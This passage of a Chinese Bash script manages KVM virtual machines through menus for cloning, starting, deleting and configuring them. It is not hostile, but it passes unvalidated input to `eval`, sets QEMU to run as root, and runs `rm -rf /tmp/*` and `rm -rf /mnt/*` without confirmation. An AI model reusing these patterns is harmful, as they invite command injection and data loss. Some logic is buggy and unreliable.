class="line">&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;"</span><br><span class="line"></span><br><span class="line">helpk="====================================================================================</span><br><span class="line">                                                                              ^</span><br><span class="line">  1.创建虚拟机，#选项的功能为克隆你的一个模板机，快速生成一个新的虚拟机，占内存小，缺点不能删除模板机</span><br><span class="line">  2.启动虚拟机，#选项的子功能为；1.查看启动的虚拟机||2.所有虚拟机||3.启动单台虚拟机||4.启动一组</span><br><span class="line">  3.3.删除虚拟机，#选项的子功能为：1.查看所有虚拟机||2.删除单台虚拟机||3.删除一组||4.上一层</span><br><span class="line">  4.4.添加硬盘， #选项的子功能为：1.查看所有虚拟机||2.添加临时硬盘||3.添加永久硬盘||4.上一层||输入你的选择||</span><br><span class="line">  5.添加网卡， #选项的子功能为：1.查看所有虚拟机||2.添加网卡||3.上一层||输入你的选择||</span><br><span class="line">  6.设置主机名与IP，#选项的子功能为：1.查看状态||2.设置单个虚拟机||3.设置一组虚拟机||4.上一层||</span><br><span class="line">  7.关闭虚拟机，#选项的子功能为：1.查看所有虚拟机||2.关闭单台虚拟机||3.关闭一组虚拟机||4.关闭所有虚拟机||5.上一层</span><br><span class="line">  8.帮助，#即为该选项</span><br><span class="line">  9.退出，#即为退出该脚本</span><br><span class="line">  888.全新机器必选项，#选项子功能为：1.自定义创建虚拟机||2.快速创建虚拟机</span><br><span class="line"><span class="meta">  #</span><span class="bash"><span class="comment">##此项位新机选择项，安装时间较长，因为是安装一个全新的Linux系统，不是克隆链接等"</span></span></span><br><span class="line"></span><br><span class="line">newkvm()&#123;</span><br><span class="line">clear</span><br><span class="line">while true</span><br><span class="line">do</span><br><span class="line">    virsh list --all    </span><br><span class="line">    read -p "$kvm2" createhost</span><br><span class="line">    case $createhost in</span><br><span class="line">    1)</span><br><span class="line">        echo "休息一下。。。"</span><br><span class="line">        yum groupinstall "Virtualization Client" "Virtualization Hypervisor" "Virtualization Platform" "Virtualization Tools" &amp;&gt; /dev/null</span><br><span class="line">        systemctl start libvirtd</span><br><span class="line">        echo "如果你是第一次使用，可以在浏览器打开下面的教程链接"</span><br><span class="line">        echo "https://blog.csdn.net/qq_41847721/article/details/100184373"</span><br><span class="line">        sleep 5</span><br><span class="line">        read -p "输入要创建的虚拟机名||" kvname</span><br><span class="line">        read -p "输入要创建的虚拟机内存【单位GB】：" agbb</span><br><span class="line">        read -p "输入要创建的虚拟机镜像位置格式：/root/aa/centos***.iso||" iios</span><br><span class="line">        #read -p "输入创建虚拟机的存放路径-格式：/root/aa/||" kpath</span><br><span class="line">        read -p "输入要创建的虚拟机硬盘大小||" ssimg</span><br><span class="line">        #echo "默认虚拟机存放路径为/home/kvm/请不要更改，否则后续无法继续使用"</span><br><span class="line">        echo "创建中... ... ..."</span><br><span class="line">        cat &lt;&lt;-EOF &gt;&gt; /etc/libvirt/qemu.conf</span><br><span class="line">	user = "root"</span><br><span class="line">	group = "root"</span><br><span class="line">	dynamic_ownership = 0</span><br><span class="line">	EOF</span><br><span class="line">        service libvirtd restart</span><br><span class="line">        mkdir /home/kvm &gt;&amp; /dev/null</span><br><span class="line">        virt-install --name $kvname --ram $agbb --vcpus 1 --location=$iios --disk path=/home/kvm/$kvname.img,size=$ssimg --graphics none --network bridge=virbr0  --extra-args "console=ttyS0"</span><br><span class="line">    </span><br><span class="line">    ;;</span><br><span class="line">    2)</span><br><span class="line">      echo "休息一下。。。"</span><br><span class="line">      sleep 1</span><br><span class="line">      yum groupinstall "Virtualization Client" "Virtualization Hypervisor" "Virtualization Platform" "Virtualization Tools" &amp;&gt; /dev/null    </span><br><span class="line">      systemctl start libvirtd</span><br><span class="line">      echo "如果你是第一次使用，可以在浏览器打开下面的教程"</span><br><span class="line">      echo "https://blog.csdn.net/qq_41847721/article/details/100184373"</span><br><span class="line">      sleep 5</span><br><span class="line">      read -p "输入要创建的虚拟机名" kvname</span><br><span class="line">      #virsh list --all |awk '/[0-9]/&#123;print $2&#125;' | awk -F - '&#123;print $1&#125;' &gt; 2.txt</span><br><span class="line">      # for i in `cat 1.txt`;do</span><br><span class="line">      virsh list --all | awk '/'$kvname'/&#123;print $2&#125;' &gt; 2.txt</span><br><span class="line">      k_vname=`grep $kvname 2.txt`</span><br><span class="line">           if [ "$k_vname" == $kvname ];then</span><br><span class="line">           echo  ============================</span><br><span class="line">           echo "======主机名已被使用========"      </span><br><span class="line">           echo  ============================</span><br><span class="line">           break</span><br><span class="line">           fi</span><br><span class="line">                 explain="输入要创建的虚拟机镜像位置格式：/root/aa/centos***.iso ||2.前面的镜像要写绝对路径："</span><br><span class="line">                 read -p "$explain" iios</span><br><span class="line">                 cat &lt;&lt;-EOF &gt;&gt; /etc/libvirt/qemu.conf</span><br><span class="line">       		 user = "root"</span><br><span class="line">        	 group = "root"</span><br><span class="line">        	 dynamic_ownership = 0</span><br><span class="line">			EOF</span><br><span class="line">                 service libvirtd restart                  </span><br><span class="line"></span><br><span class="line">                 touch a-log.txt b-log.txt &amp;&gt; /dev/null</span><br><span class="line">                 mkdir /home/kvm &amp;&gt; /dev/null</span><br><span class="line">                 virt-install --name $kvname --ram 512 --vcpus 1 --location=$iios --disk path=/home/kvm/$kvname.qcow2,size=5 --graphics none --network bridge=virbr0  --extra-args "console=ttyS0"</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    ;;</span><br><span class="line">    *)break;;</span><br><span class="line">    esac</span><br><span class="line">done</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">createkvm()&#123;</span><br><span class="line">clear</span><br><span class="line">while true</span><br><span class="line">do</span><br><span class="line">    virsh list --all</span><br><span class="line">    read -p "1.创建单个||2.创建一组||3.返回上一层" creategroup</span><br><span class="line">    if [ $creategroup -eq 1 ] ; then</span><br><span class="line">    read -p "创建虚拟机的名字: " host_name</span><br><span class="line">    #hostname=`virsh list --all |awk '/[0-9]/&#123;print $2&#125;' | awk -F - '&#123;print $1&#125;' &gt; 1.txt`</span><br><span class="line">    virsh list --all |awk '/[0-9]/&#123;print $2&#125;' | awk -F - '&#123;print $1&#125;' &gt; 1.txt</span><br><span class="line">    for i in `cat 1.txt`;do</span><br><span class="line">         if [ "$i" == "$host_name" ] ; then</span><br><span class="line">            echo $i</span><br><span class="line">            echo "============================"</span><br><span class="line">            echo "======主机名已被使用========"</span><br><span class="line">            echo "============================"        </span><br><span class="line">            break ; break</span><br><span class="line">         fi</span><br><span class="line">    done</span><br><span class="line">            read -p "请输入一个已存在的模板主机名：" h_ostname</span><br><span class="line">            mkdir /home/kvm &amp;&gt; /dev/null</span><br><span class="line">            echo "$h_ostname"</span><br><span class="line">            eval qemu-img create -f qcow2 -b /home/kvm/$&#123;h_ostname&#125;.qcow2 /home/kvm/$&#123;host_name&#125;.qcow2</span><br><span class="line">            eval /bin/cp -f /etc/libvirt/qemu/$&#123;h_ostname&#125;.xml /etc/libvirt/qemu/$&#123;host_name&#125;.xml</span><br><span class="line">            sed -i "/$h_ostname/s//$host_name/" /etc/libvirt/qemu/$&#123;host_name&#125;.xml</span><br><span class="line">            sed -i '/&lt;uuid&gt;/d' /etc/libvirt/qemu/$&#123;host_name&#125;.xml</span><br><span class="line">            sed -i '/&lt;mac address/d' /etc/libvirt/qemu/$&#123;host_name&#125;.xml</span><br><span class="line">            sed -i '/'source'/s/'$&#123;h_ostname&#125;.qcow2'/'$&#123;host_name&#125;.qcow2'/' /etc/libvirt/qemu/$&#123;host_name&#125;.xml</span><br><span class="line">            virsh define /etc/libvirt/qemu/$&#123;host_name&#125;.xml</span><br><span class="line">            echo "虚拟机已创建"</span><br><span class="line">        </span><br><span class="line">    elif [ $creategroup -eq 2 ] ; then</span><br><span class="line">       read -p "请输入您想创建的虚拟机个数" num1</span><br><span class="line">       read -p "创建虚拟机的名字: " host_name</span><br><span class="line">       virsh list --all |awk '/[0-9]/&#123;print $2&#125;' | awk -F - '&#123;print $1&#125;' &gt; 1.txt</span><br><span class="line">       for i in `cat 1.txt`;do</span><br><span class="line">           if [ "$i" == $host_name ];then</span><br><span class="line">           echo $i</span><br><span class="line">           echo  ============================</span><br><span class="line">           echo "======主机名已被使用========"      </span><br><span class="line">           echo  ============================</span><br><span class="line">           break                   </span><br><span class="line">           fi</span><br><span class="line">           done</span><br><span class="line">       		#read -p "创建虚拟机的名字: " host_name</span><br><span class="line">       		read -p "请输入一个已存在的模板主机名：" h_ostname</span><br><span class="line">       		for((n=1;n&lt;=$num1;n++))</span><br><span class="line">       		do</span><br><span class="line">       		       local name=$&#123;host_name&#125;-$&#123;n&#125;</span><br><span class="line">       		       eval qemu-img create -f qcow2 -b /home/kvm/$&#123;h_ostname&#125;.qcow2 /home/kvm/$&#123;name&#125;.qcow2 &amp;&gt; /dev/null </span><br><span class="line">       		       eval /bin/cp -f /etc/libvirt/qemu/$&#123;h_ostname&#125;.xml /etc/libvirt/qemu/$&#123;name&#125;.xml &amp;&gt; /dev/null          </span><br><span class="line">       		       sed -i "/$h_ostname/s//$name/" /etc/libvirt/qemu/$&#123;name&#125;.xml &amp;&gt;/dev/null</span><br><span class="line">       		       sed -i '/&lt;uuid&gt;/d' /etc/libvirt/qemu/$&#123;name&#125;.xml &amp;&gt; /dev/null</span><br><span class="line">       		       sed -i '/&lt;mac address/d' /etc/libvirt/qemu/$&#123;name&#125;.xml &amp;&gt; /dev/null</span><br><span class="line">       		       sed -i '/'source'/s/'$&#123;h_ostname&#125;.qcow2'/'$&#123;name&#125;.qcow2'/' /etc/libvirt/qemu/$&#123;name&#125;-$i.xml &amp;&gt; /dev/null</span><br><span class="line">       		       virsh define /etc/libvirt/qemu/$&#123;name&#125;.xml &amp;&gt; /dev/null</span><br><span class="line">       		                                  </span><br><span class="line">       		done                          </span><br><span class="line">       		echo "虚拟机已创建完成"</span><br><span class="line">    elif [ $creategroup -eq 3 ] ; then</span><br><span class="line">        break</span><br><span class="line">    fi</span><br><span class="line">done</span><br><span class="line">&#125;</span><br><span class="line">catkvm()&#123;</span><br><span class="line">     clear</span><br><span class="line">     virsh list --all</span><br><span class="line">     sleep 3</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">startkvm()&#123;</span><br><span class="line">clear</span><br><span class="line">virsh list --all</span><br><span class="line">sunm1="1.查看启动的虚拟机||2.所有虚拟机||3.启动单台虚拟机||4.启动一组||5.上一层"</span><br><span class="line">while true</span><br><span class="line">do</span><br><span class="line">     #   clear</span><br><span class="line">     #virsh list --all</span><br><span class="line">     read -p "$sunm1" sunm2</span><br><span class="line">     case $sunm2 in</span><br><span class="line">     1)</span><br><span class="line">         virsh list</span><br><span class="line">     ;;</span><br><span class="line">     2)</span><br><span class="line">         virsh list --all</span><br><span class="line">     ;;</span><br><span class="line">     3)</span><br><span class="line">         read -p "输入要启动虚拟机名称" startkvm1</span><br><span class="line">         #startkvm2=` virsh list --all |awk '/'$startkvm1'/&#123;print $2&#125;'`</span><br><span class="line">         virsh start $startkvm1</span><br><span class="line">     ;;</span><br><span class="line">     4)</span><br><span class="line">        virsh list --all</span><br><span class="line">        echo "通组开启仅适用与通组创建"</span><br><span class="line">                read -p "请输入您想关闭的这组虚拟机名称的前缀[只能是字母]: " your_name</span><br><span class="line">                sum1=`virsh list --all | awk '/[0-9]/&#123;print $2&#125;' | grep $your_name | wc -l`</span><br><span class="line">                for i in `seq $sum1`;do</span><br><span class="line">                        virsh start $your_name-$i</span><br><span class="line">                done</span><br><span class="line">                echo "一组虚拟机已经成功启动!"</span><br><span class="line">     ;;</span><br><span class="line">     *)</span><br><span class="line">         break</span><br><span class="line">     ;;</span><br><span class="line">     esac</span><br><span class="line">done</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">deletekvm()&#123;</span><br><span class="line">sunm3="1.查看所有虚拟机||2.删除单台虚拟机||3.删除一组||4.上一层"</span><br><span class="line">clear</span><br><span class="line">while true</span><br><span class="line">do </span><br><span class="line">   </span><br><span class="line">   virsh list --all</span><br><span class="line">   read -p "$sunm3" sunnm4 </span><br><span class="line">   case $sunnm4 in</span><br><span class="line">   1)</span><br><span class="line">       virsh list --all</span><br><span class="line">   ;;</span><br><span class="line">   2)</span><br><span class="line">       read -p "输入要删除虚拟机主机" deletekvm1</span><br><span class="line">       stdelete=`virsh list --all | grep $deletekvm1 |awk -v akv=$deletekvm1 '&#123;if($2==akv)print $3&#125;'`</span><br><span class="line">       if [ $stdelete != "running" ] ; then</span><br><span class="line">           deletekvm2=`virsh list --all | grep $deletekvm1 |awk -v akv=$deletekvm1 '&#123;if($2==akv)print $2&#125;'`</span><br><span class="line">           virsh undefine $deletekvm2</span><br><span class="line">           rm -rf /home/kvm/$&#123;deletekvm2&#125;.qcow2        </span><br><span class="line">           rm -rf /etc/libvirt/qemu/$&#123;deletekvm2&#125;.xml</span><br><span class="line">           echo "删除成功！！！！！！！！！！！！！！！！！！！！！"</span><br><span class="line">       else</span><br><span class="line">           echo "请先将虚拟机关机！！！！！！！！！！！！！！！！！！！！"</span><br><span class="line">       fi</span><br><span class="line">   ;;</span><br><span class="line">   3)</span><br><span class="line">       echo "通组删除仅适用与通组创建"</span><br><span class="line">       virsh list --all</span><br><span class="line">                read -p "请输入您想删除的这组虚拟机名称的前缀[只能是字母]: " your_name</span><br><span class="line">                sum=`virsh list --all | awk '/[0-9]/&#123;print $2&#125;' | grep $your_name | wc -l`</span><br><span class="line">                for i in `seq $sum`;do</span><br><span class="line">                        virsh undefine $your_name-$i.qcow2</span><br><span class="line">                        rm -rf /home/kvm/$your_name-$i.qcow2</span><br><span class="line">                        rm -rf /etc/libvirt/qemu/$your_name-$i.xml</span><br><span class="line">                done</span><br><span class="line">                echo "一组虚拟机已经成功删除!"</span><br><span class="line">   ;;</span><br><span class="line">   *)</span><br><span class="line">       break</span><br><span class="line">   ;;</span><br><span class="line">   esac</span><br><span class="line">done</span><br><span class="line">&#125;</span><br><span class="line">addsdkvm()&#123;</span><br><span class="line">sunm4="1.查看所有虚拟机||2.添加临时硬盘||3.添加永久硬盘||4.上一层||输入你的选择||"</span><br><span class="line">clear</span><br><span class="line">while true</span><br><span class="line">do</span><br><span class="line">   virsh list --all</span><br><span class="line">   echo "添加硬盘必需在虚拟机开机状态下进行，不然会报错！！！"</span><br><span class="line">   read -p "$sunm4" sunnm5</span><br><span class="line">   case $sunnm5 in</span><br><span class="line">   1)virsh list --all;;</span><br><span class="line">   2)</span><br><span class="line">       clear</span><br><span class="line">       virsh list --all</span><br><span class="line">        </span><br><span class="line">       read -p "输入要添加硬盘虚拟机的ID" startkvm3</span><br><span class="line">       read -p "输入要添加硬盘虚拟机名称" startkvm3</span><br><span class="line">       startkvm2=`virsh list --all |awk '/'$startkvm3'/&#123;print $2&#125;'`</span><br><span class="line">       virsh list --all | awk '/'$startkvm3'/&#123;print $2&#125;' &gt; 1.txt</span><br><span class="line">       runni=`virsh list --all | awk '/'$startkvm3'/&#123;print $3&#125;'`</span><br><span class="line">       ame_host=`grep $startkvm2 1.txt`</span><br><span class="line">       if [ $startkvm2 == $ame_host ] ; then</span><br><span class="line">           if [ $runni == "running" ] ; then</span><br><span class="line">                   for i in a b c d e f g h i j k l m n o p q r s t o v w x y z;do</span><br><span class="line">                       virsh domblklist $startkvm2 | grep vd$i &gt; /dev/null</span><br><span class="line">                       if [ $? -ne 0 ] ; then</span><br><span class="line">                       echo $i </span><br><span class="line">                              read -p "请输入您想添加的磁盘大小[只能是整数，默认单位为GB]:" asize</span><br><span class="line">                              qemu-img create -f qcow2 /home/kvm/$&#123;startkvm2&#125;-$i.img $&#123;asize&#125;G &gt;/dev/null </span><br><span class="line">                              virsh attach-disk $startkvm2 /home/kvm/$&#123;startkvm2&#125;-$i.img vd$i &gt; /dev/null</span><br><span class="line"><span class="meta"> #</span><span class="bash">--cache writeback --subdriver qcow2 --persistent</span></span><br><span class="line">                              echo "磁盘添加成功！！"</span><br><span class="line">                              sleep 3</span><br><span class="line">                              echo "如果未设置成功，请先到虚拟机内使用【fdisk -l】查看，或重新添加"</span><br><span class="line">                              break                         </span><br><span class="line">                       fi     </span><br><span class="line">                   done               </span><br><span class="line">           else</span><br><span class="line">               echo "主机必需在运行【running】状态"</span><br><span class="line">           fi</span><br><span class="line">               </span><br><span class="line">       else </span><br><span class="line">           echo "主机不存在"        </span><br><span class="line">       fi</span><br><span class="line">          </span><br><span class="line">   ;;</span><br><span class="line">   3)</span><br><span class="line">      echo "||待开发。。。。。。||"</span><br><span class="line">      sleep 3</span><br><span class="line">   ;;</span><br><span class="line">   *)</span><br><span class="line">    break</span><br><span class="line">   ;;   </span><br><span class="line"></span><br><span class="line">   esac</span><br><span class="line">done</span><br><span class="line">&#125;</span><br><span class="line">addifcfig()&#123;</span><br><span class="line">sunma1="1.查看所有虚拟机||2.添加网卡||3.上一层||输入你的选择||"</span><br><span class="line">clear</span><br><span class="line">while true</span><br><span class="line">do</span><br><span class="line">    virsh list --all</span><br><span class="line">    echo "添加网卡必需在虚拟机开机状态下进行，不然会报错！！！"</span><br><span class="line">    read -p "$sunma1" sunma2</span><br><span class="line">    case $sunma2 in</span><br><span class="line">    1)virsh list --all;;</span><br><span class="line">    2)</span><br><span class="line">    read -p "请输入您想添加网卡的虚拟机的ID: " s_tartkvm</span><br><span class="line">    read -p "请输入您想添加网卡的虚拟机名" startk_vm</span><br><span class="line">    startkv_m=` virsh list --all |awk '/'$s_tartkvm'/&#123;print $2&#125;'`</span><br><span class="line">    if [ $startk_vm == $startkv_m ] ; then</span><br><span class="line">        virsh attach-interface $s_tartkvm --type bridge --source virbr0 --persistent</span><br><span class="line">        if [ $? -eq 0 ] ; then</span><br><span class="line">              echo "网卡添加成功！！"</span><br><span class="line">        else</span><br><span class="line">              echo "您的网卡好像没有添加成功哟！！"</span><br><span class="line">        fi</span><br><span class="line">    else</span><br><span class="line">         echo "您输入的主机名不存在！！"</span><br><span class="line">    fi</span><br><span class="line"></span><br><span class="line">    ;;</span><br><span class="line">    *)break;;</span><br><span class="line">    esac</span><br><span class="line">done</span><br><span class="line">&#125;</span><br><span class="line">stopkvm()&#123;</span><br><span class="line">sunam3="1.查看所有虚拟机||2.关闭单台虚拟机||3.关闭一组虚拟机||4.关闭所有虚拟机||5.上一层"</span><br><span class="line">clear</span><br><span class="line">virsh list --all</span><br><span class="line">while true</span><br><span class="line">do</span><br><span class="line">    read -p "$sunam3" sunam4</span><br><span class="line">    case $sunam4 in</span><br><span class="line">    1)virsh list --all;;</span><br><span class="line">    2)read -p "输入要关闭虚拟机的ID" startkv1m</span><br><span class="line">         startkv2m=` virsh list --all |awk '/'$startkv1m'/&#123;print $2&#125;'`</span><br><span class="line">         virsh list --all | awk '&#123;print $2&#125;' &gt; 1.txt</span><br><span class="line">         com_name=`grep $startkv2m 1.txt`</span><br><span class="line">         if [ "$com_name" == $startkv2m ] ; then</span><br><span class="line">                virsh destroy $startkv2m</span><br><span class="line">                echo "您的虚拟机已经关闭！！"</span><br><span class="line">         else</span><br><span class="line">                echo "输入错误！！"</span><br><span class="line">         fi</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    ;;</span><br><span class="line">    3)</span><br><span class="line">        virsh list --all</span><br><span class="line">                read -p "请输入您想关闭的这组虚拟机名称的前缀[只能是字母]: " your_name</span><br><span class="line">                sum=`virsh list --all | awk '/[0-9]/&#123;print $2&#125;' | grep $your_name | wc -l`</span><br><span class="line">                for i in `seq $sum`;do</span><br><span class="line">                        virsh destroy $your_name-$i &amp;&gt; /dev/null</span><br><span class="line">                done</span><br><span class="line">                echo "一组虚拟机已经成功关闭!"</span><br><span class="line">    ;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    4)</span><br><span class="line">         for i in `virsh list --all |awk '/[0-9]/&#123;print $2&#125;'`;do</span><br><span class="line">                        virsh destroy $i</span><br><span class="line">                done</span><br><span class="line">                        echo "您的虚拟机已经全部关闭！"</span><br><span class="line"></span><br><span class="line">    ;;</span><br><span class="line">    *)break;;</span><br><span class="line">    esac</span><br><span class="line">done</span><br><span class="line">&#125;</span><br><span class="line">ipactive()&#123;</span><br><span class="line">clear</span><br><span class="line">echo "请在关机状态下进行，不然出错自负！！"</span><br><span class="line">action1="1.查看状态||2.设置单个虚拟机||3.设置一组虚拟机||4.上一层||"</span><br><span class="line">while true</span><br><span class="line">do  </span><br><span class="line">    read -p "$action1" action2</span><br><span class="line">    case $action2 in</span><br><span class="line">    1)virsh list --all;;</span><br><span class="line">    2)</span><br><span class="line">         clear</span><br><span class="line">         virsh list --all</span><br><span class="line">         echo "请在关机状态下进行，不然出错自负！！"</span><br><span class="line">         read -p "请输入您想设置的虚拟机名称: " host_action</span><br><span class="line">         virsh list --all | awk '/[0-9]/&#123;print $2&#125;' &gt; 1.txt</span><br><span class="line">         name_host=`grep $host_action 1.txt`</span><br><span class="line">         if [ "$name_host" == $host_action ] ; then</span><br><span class="line">               read -p "请输入您想设置的ip： " ip</span><br><span class="line">               read -p "请输入您想设置的主机名： " host6</span><br><span class="line">               read -p "确认你输入的是否正确[yes] " sure</span><br><span class="line">               gateway=`echo $ip | awk -F \. '&#123;print $1"."$2"."$3&#125;'`</span><br><span class="line">               if [ "$sure" == "yes" ];then</span><br><span class="line">                        cd</span><br><span class="line">                        virsh destroy $host_action &amp;&gt;/dev/null</span><br><span class="line">                        umount /mnt &amp;&gt; /dev/null</span><br><span class="line">                        rm -rf /mnt/*</span><br><span class="line">                        ifcfg=/mnt/etc/sysconfig/network-scripts/ifcfg-eth0</span><br><span class="line">                        guestmount -a /home/kvm/$&#123;host_action&#125;.qcow2 -i /mnt/</span><br><span class="line">                                cat &lt;&lt;-EOF &gt; /mnt/etc/sysconfig/network-scripts/ifcfg-eth0</span><br><span class="line">                                NAME=eth0</span><br><span class="line">                                DEVICE=eth0</span><br><span class="line">                                BOOTPROTO=none</span><br><span class="line">                                ONBOOT=yes</span><br><span class="line">                                IPADDR=$ip</span><br><span class="line">                                GATEWAY=$gateway.1</span><br><span class="line">                                PREFIX=24</span><br><span class="line">				EOF</span><br><span class="line">                        sed -i 's/^ *//g' $ifcfg</span><br><span class="line">                        sed -i 's/\t//g' $ifcfg</span><br><span class="line">                        echo $host6 &gt; /mnt/etc/hostname</span><br><span class="line">                        echo $ip $host6 &gt;&gt; /mnt/etc/hosts</span><br><span class="line">                        umount /mnt</span><br><span class="line">                        virsh start $host_action</span><br><span class="line">                        echo 任务完成！</span><br><span class="line">               else</span><br><span class="line">                     echo "请确认正确！！"</span><br><span class="line">                  </span><br><span class="line">               fi</span><br><span class="line">         else</span><br><span class="line">            echo "虚拟机不存在！！"</span><br><span class="line">           </span><br><span class="line">         fi</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    ;;</span><br><span class="line">    3)</span><br><span class="line">        virsh list --all</span><br><span class="line">                rm -rf /tmp/*</span><br><span class="line">                echo "请在关机状态下进行，不然出错自负！！"</span><br><span class="line">                read -p "请输入您想设置的一组虚拟名称的前缀[只能是前面的英文字母]: " h_action</span><br><span class="line">                read -p "请输入您想设置的起始ip： " ip</span><br><span class="line">                gateway=`echo $ip | awk -F \. '&#123;print $1"."$2"."$3&#125;'`</span><br><span class="line">                next_ip=`echo $ip | awk -F \. '&#123;print $4&#125;'`</span><br><span class="line">                num=`virsh list --all | awk '/[0-9]/&#123;print $2&#125;' | grep $h_action | wc -l`</span><br><span class="line">                for i in `seq $num`;do</span><br><span class="line">                        read -p "请输入您想设置的第$i个主机名： " hostname1</span><br><span class="line">                        echo "$gateway.$next_ip $hostname1" &gt;&gt; /tmp/hosts.txt</span><br><span class="line">                        let next_ip=next_ip+1</span><br><span class="line">                done</span><br><span class="line">                echo "Please wait a minute..............................."</span><br><span class="line">                cd</span><br><span class="line">                for i in `seq $num`;do</span><br><span class="line">                        virsh destroy $h_action-$i &amp;&gt;/dev/null</span><br><span class="line">                        umount /mnt &amp;&gt; /dev/null</span><br><span class="line">                        if [ ! -z /mnt ];then</span><br><span class="line">                                ifcfg=/mnt/etc/sysconfig/network-scripts/ifcfg-eth0</span><br><span class="line">                                guestmount -a /home/kvm/$h_action-$i.qcow2 -i /mnt/</span><br><span class="line">                                cat &lt;&lt;-EOF &gt; /mnt/etc/sysconfig/network-scripts/ifcfg-eth0</span><br><span class="line">                                NAME=eth0</span><br><span class="line">                                DEVICE=eth0</span><br><span class="line">                                BOOTPROTO=none</span><br><span class="line">                                ONBOOT=yes</span><br><span class="line">                                IPADDR=`head -$i /tmp/hosts.txt | tail -1 | awk '&#123;print $1&#125;'`</span><br><span class="line">                                GATEWAY=$gateway.1</span><br><span class="line">                                PREFIX=24</span><br><span class="line">				EOF</span><br><span class="line">                                sed -i 's/^ *//g' $ifcfg</span><br><span class="line">                                sed -i 's/\t//g' $ifcfg</span><br><span class="line">                                head -$i /tmp/hosts.txt | tail -1 | awk '&#123;print $2&#125;' &gt; /mnt/etc/hostname                </span><br><span class="line">                                cat /tmp/hosts.txt &gt;&gt; /mnt/etc/hosts</span><br><span class="line">                                echo nameserver 8.8.8.8 &gt;&gt; /mnt/etc/resolv.conf</span><br><span class="line">                                umount /mnt</span><br><span class="line">                        else</span><br><span class="line">                                echo 您的镜像没有依次进行挂载卸载,请检查！</span><br><span class="line">                                exit</span><br><span class="line">                        fi</span><br><span class="line">                done</span><br><span class="line">                echo "设置完成!"</span><br><span class="line">    ;;</span><br><span class="line">    *)</span><br><span class="line">       break</span><br><span class="line">    ;;</span><br><span class="line">    esac</span><br><span class="line">done</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">helpkvm()&#123;</span><br><span class="line">clear</span><br><span class="line">while true</span><br><span class="line">do</span><br><span class="line">    #virsh list --all</span><br><span class="line">    read -p "||1.查看所有帮助||h.查看帮助||q.上一层||" iii</span><br><span class="line">    case $iii in</span><br><span class="line">    1)</span><br><span class="line">       echo "$helpk"</span><br><span class="line">       sleep 5</span><br><span class="line">    ;;</span><br><span class="line">    2)</span><br><span class="line">        echo "$helpk"</span><br><span class="line">       sleep 2</span><br><span class="line">    ;;</span><br><span class="line">    q)</span><br><span class="line">        break</span><br><span class="line">    ;;</span><br><span class="line">    h)</span><br><span class="line">       echo "$helpk"</span><br><span class="line">       sleep 3</span><br><span class="line">     ;;</span><br><span class="line">    *)</span><br><span class="line">        break</span><br><span class="line">    ;;</span><br><span class="line">    esac</span><br><span class="line">done</span><br><span class="line">&#125;</span><br><span class="line">quitkvm()&#123;</span><br><span class="line">    exit</span><br><span class="line">&#125;</span><br><span class="line">setkvm()&#123;</span><br><span class="line">clear</span><br><span class="line">virsh list --all</span><br><span class="line">setk1="1.查看状态||2.设置单个虚拟机cpu||3.设置一组虚拟机cpu||4.上一层||"</span><br><span class="line">while true</span><br><span class="line">do</span><br><span class="line">    read -p "$setk1" setk2</span><br><span class="line">    case $setk2 in</span><br><span class="line">    1)</span><br><span class="line">         read -p "输入要查看的虚拟机||" setk3</span><br><span class="line">         virsh dominfo $setk3</span><br><span class="line">    ;;</span><br><span class="line">    2)</span><br><span class="line">    read -p "输入要设置的虚拟机" setkvm1</span><br><span class="line">    read -p "输入设置cpu核数||可以增加||可以减小||" cpu1</span><br><span class="line">    setkvm2=`virsh list --all | grep $setkvm1 |awk -v akv=$setkvm1 '&#123;if($2==akv)print $3&#125;'`</span><br><span class="line">    setkvm3=`virsh list --all | awk '/'$setkvm1'/&#123;print $2&#125;'`</span><br><span class="line">    if [ $setkvm2 == "running" ] ; then</span><br><span class="line">       echo "请先将虚拟机关机！！！！！！！！！！！！！！！！！！！！"</span><br><span class="line">    elif [ $setkvm3 == $setkvm1 ] ; then</span><br><span class="line">        virsh destroy $setkvm1</span><br><span class="line">        setkvm4=`virsh dominfo $setkvm1 | awk -F " " '/CPU/&#123;print $2&#125;' |awk '/[0-9]/&#123;print $0&#125;'`</span><br><span class="line">        sed -i '/vcpu/s/'$setkvm4'/'$cpu1'/' /etc/libvirt/qemu/$setkvm1.xml</span><br><span class="line">        virsh define /etc/libvirt/qemu/$setkvm1.xml</span><br><span class="line">        virsh start $setkvm1</span><br><span class="line">        echo "设置成功！！！！！！！！！！！！！！！！！！！！！"</span><br><span class="line">    else</span><br><span class="line">           echo "虚拟机不存在！！！！！！！！！！！！！！！！！！！！"</span><br><span class="line">    fi</span><br><span class="line">    ;;</span><br><span class="line">    3)</span><br><span class="line">        echo "待开发"</span><br><span class="line">        sleep 5 </span><br><span class="line">    ;;</span><br><span class="line">    *)break;;</span><br><span class="line">    esac</span><br><span class="line">done</span><br><span class="line">&#125;</span><br><span class="line">memorykvm()&#123;</span><br><span class="line">clear</span><br><span class="line">virsh list --all</span><br><span class="line">memory1="1.查看状态||2.设置单个虚拟机内存||3.设置一组虚拟机内存||4.上一层||"</span><br><span class="line">while true</span><br><span class="line">do</span><br><span class="line">    read -p "$memory1" memory2</span><br><span class="line">    case $memory2 in</span><br><span class="line">    1)</span><br><span class="line">       read -p "输入要查看的虚拟机||" setk3</span><br><span class="line">       virsh dominfo $setk3</span><br><span class="line">    ;;</span><br><span class="line">    2)</span><br><span class="line">         read -p 